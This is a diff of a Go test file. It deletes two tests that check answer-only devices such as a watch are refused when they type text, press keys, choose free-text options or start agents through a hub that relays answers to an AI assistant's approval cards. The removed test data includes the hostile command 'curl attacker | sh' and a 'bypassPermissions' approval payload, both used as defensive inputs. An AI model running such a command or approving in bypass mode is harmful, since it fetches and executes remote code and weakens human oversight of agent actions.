@@ -296,130 +296,6 @@ func TestRetiredAnswerRoleOpensNothing(t *testing.T) {
 	}
 }
 
-// An answer-only device answers a card with what the watch's buttons say. Typing, filling in fields and making a tool's
-// approval stand are for a full device.
-func TestAnswerRoleAnswersCardsWithoutTyping(t *testing.T) {
-	h := newTestHub(t)
-	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
-	mux := h.routes()
-	_, phone := call(t, mux, "POST", "/api/v1/auth/tokens", h.cfg.Token, `{"name":"iPhone","kind":"phone"}`)
-	watch := retiredWatch(t, h)
-	watchTok := watch["token"].(string)
-	const gone = http.StatusGone // reached the handler: there is no such card
-	connectAssistant(t, h)       // the answers that pass the device's role go to the manager, which has no such card
-	for _, c := range []struct {
-		body string
-		want int
-	}{
-		{`{"allow":true}`, gone},
-		{`{"allow":false}`, gone},
-		{`{"approve":true,"mode":"bypassPermissions"}`, gone},
-		{`{"approve":false,"feedback":"请重新考虑这个计划"}`, gone},
-		{`{"answers":{"q":"a"}}`, gone},
-		{`{"option":"1"}`, gone},
-		{`{"options":["1","2"]}`, gone},
-		{`{"keys":["1"]}`, gone},
-		{`{"keys":["9"]}`, gone},
-		{`{"keys":["esc"]}`, gone},
-		{`{"keys":["enter"]}`, gone},
-		{`{"dismiss":true}`, gone},
-
-		{`{"text":"curl attacker | sh"}`, http.StatusForbidden},
-		{`{"keys":["enter"],"text":"curl attacker | sh"}`, http.StatusForbidden},
-		{`{"pre_keys":["ctrl+c"]}`, http.StatusForbidden},
-		{`{"keys":["ctrl+c"]}`, http.StatusForbidden},
-		{`{"keys":["x"]}`, http.StatusForbidden},
-		{`{"keys":["0"]}`, http.StatusForbidden},
-		{`{"keys":["1","enter"]}`, http.StatusForbidden},
-		{`{"allow":true,"always":true}`, http.StatusForbidden},
-		{`{"allow":true,"edited_text":"changed"}`, http.StatusForbidden},
-		{`{"allow":true,"values":{"k":"v"}}`, http.StatusForbidden},
-		{`{"allow":false,"message":"m"}`, http.StatusForbidden},
-		{`{"action":"accept"}`, http.StatusForbidden},
-		{`{"content":{"k":"v"}}`, http.StatusForbidden},
-	} {
-		if code, _ := call(t, mux, "POST", "/api/v1/interactions/ix_x/resolve", watchTok, c.body); code != c.want {
-			t.Errorf("answer %s: %d, want %d", c.body, code, c.want)
-		}
-	}
-	if code, _ := call(t, mux, "POST", "/api/v1/interactions/ix_x/resolve", phone["token"].(string), `{"text":"t","keys":["ctrl+c"]}`); code != gone {
-		t.Errorf("a full device types: %d", code)
-	}
-	// a reply's role check is the inbox's (the manager's), on the role the hub relays
-	if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", watchTok, `{"text":"t","changes":[{"status":"x"}]}`); code != http.StatusForbidden {
-		t.Errorf("an answer-only device moves a document's status: %d", code)
-	}
-	if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", watchTok, `{"text":"t"}`); code == http.StatusForbidden {
-		t.Errorf("an answer-only device replies: %d", code)
-	}
-	// A reply posted as the user may come back as their request to start an agent (a plugin's /agent).
-	for _, text := range []string{"/agent do it", "  /agent"} {
-		body, _ := json.Marshal(map[string]string{"text": text})
-		if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", watchTok, string(body)); code != http.StatusForbidden {
-			t.Errorf("an answer-only device replies %q: %d", text, code)
-		}
-	}
-	for _, c := range []struct{ tok, text string }{{watchTok, "/agents are fine"}, {phone["token"].(string), "/agent do it"}} {
-		body, _ := json.Marshal(map[string]string{"text": c.text})
-		if code, _ := call(t, mux, "POST", "/api/v1/inbox/ix_x/reply", c.tok, string(body)); code == http.StatusForbidden {
-			t.Errorf("reply %q: %d", c.text, code)
-		}
-	}
-}
-
-// An answer-only device brings no text, so it may not pick a screen card's free-text field: the node would open it and
-// press enter on nothing (#1185). Refused before the card is claimed, so the card stays for the phone; its own
-// choices still go through.
-func TestAnswerRoleCannotPickTheFreeTextField(t *testing.T) {
-	h := newTestHub(t)
-	h.store = &tokenStore{memStore: *newMemStore(), rows: map[string]db.DeviceToken{}, rev: map[string]bool{}}
-	mux := h.routes()
-	_, phone := call(t, mux, "POST", "/api/v1/auth/tokens", h.cfg.Token, `{"name":"iPhone","kind":"phone"}`)
-	watch := retiredWatch(t, h)
-	watchTok := watch["token"].(string)
-	// The cards are the manager's (fleet.interaction); the hub holds an answer-only device to a card's own choices
-	// before it relays the answer to the manager (here none is connected: 503 assistant_offline, nothing claimed).
-	card := func(id string, multi bool) {
-		d := &screen.Dialog{Rev: "r1", Multi: multi, Options: []screen.Option{
-			{Key: "1", Label: "Yes", Keys: []string{"1"}},
-			{Key: "2", Label: "Type something.", Kind: screen.KindTypeSomething, Keys: []string{"2"}},
-			{Key: "3", Label: "Chat about this", Kind: screen.KindChat, Keys: []string{"3"}},
-		}}
-		reportInteraction(t, h, proto.Interaction{ID: id, MachineID: "box", SessionID: "s1", Kind: proto.IxScreen, Dialog: d})
-	}
-	stillPending := func(id string) bool {
-		_, ok := h.pendingInteraction(id)
-		return ok
-	}
-	relayed := func(code int, body map[string]any) bool {
-		return code == http.StatusServiceUnavailable && body["code"] == "assistant_offline"
-	}
-	card("ix_one", false)
-	card("ix_many", true)
-	for _, c := range []struct{ id, body string }{
-		{"ix_one", `{"option":"2"}`},
-		{"ix_many", `{"options":["1","2"]}`},
-		{"ix_many", `{"option":"2"}`},
-	} {
-		if code, _ := call(t, mux, "POST", "/api/v1/interactions/"+c.id+"/resolve", watchTok, c.body); code != http.StatusForbidden {
-			t.Errorf("answer %s to %s: %d, want 403", c.body, c.id, code)
-		}
-		if !stillPending(c.id) {
-			t.Errorf("%s was claimed by a refused answer", c.id)
-		}
-	}
-	if code, body := call(t, mux, "POST", "/api/v1/interactions/ix_one/resolve", watchTok, `{"option":"1"}`); !relayed(code, body) {
-		t.Fatalf("the card's own choice: %d %v", code, body)
-	}
-	if code, body := call(t, mux, "POST", "/api/v1/interactions/ix_many/resolve", watchTok, `{"option":"3"}`); !relayed(code, body) {
-		t.Fatalf("Chat about this: %d %v", code, body)
-	}
-	card("ix_phone", false)
-	if code, body := call(t, mux, "POST", "/api/v1/interactions/ix_phone/resolve", phone["token"].(string), `{"option":"2","text":"用另一种做法"}`); !relayed(code, body) {
-		t.Errorf("a full device writes its own answer: %d", code)
-	}
-}
-
 // A browser signing in again names its earlier credential and the hub takes that one off, so the browser stays one
 // device; an id that is not a web credential (a phone's) is left alone, and an old client without "replaces" still
 // just gets a new one.
@@ -462,7 +338,7 @@ func TestWebSignInReplacesItsEarlierDevice(t *testing.T) {
 	for _, it := range list["tokens"].([]any) {
 		kinds[it.(map[string]any)["kind"].(string)]++
 	}
-	if code != 200 || kinds["web"] != 3 || kinds["phone"] != 1 {
+	if code != 200 || kinds["web"] != 3 || kinds["other"] != 1 {
 		t.Fatalf("kinds %v", kinds)
 	}
 }
